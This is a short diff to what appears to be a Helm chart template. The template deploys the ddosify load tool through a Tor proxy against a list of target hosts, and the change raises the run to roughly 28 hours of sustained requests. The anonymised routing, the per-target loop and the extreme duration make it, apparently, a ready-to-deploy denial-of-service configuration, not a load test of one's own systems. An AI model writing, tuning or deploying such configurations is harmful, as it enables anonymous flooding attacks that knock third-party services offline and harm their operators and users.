@@ -42,10 +42,10 @@ spec:
           image: "{{ $.Values.ddosify.image.repository }}:{{ $.Values.ddosify.image.tag }}"
           imagePullPolicy: {{ $.Values.ddosify.image.pullPolicy }}
           command:
-            - sh
-            - -c
+            - '/bin/sh'
+            - '-c'
             - |
-              ddosify -P http://{{ $.Values.tor.host }}:{{ $.Values.tor.proxyPort }} -p {{ $target.ddosify.protocol | default "HTTPS" }} -t {{ $target.host }} -d 3600
+              ddosify -n 500 -d 99999 -P http://{{ $.Values.tor.host }}:{{ $.Values.tor.proxyPort }} -p {{ $target.ddosify.protocol | default "HTTPS" }} -t {{ $target.host }}
           resources:
             {{- toYaml $target.ddosify.resources | nindent 12 }}
         {{- end }}
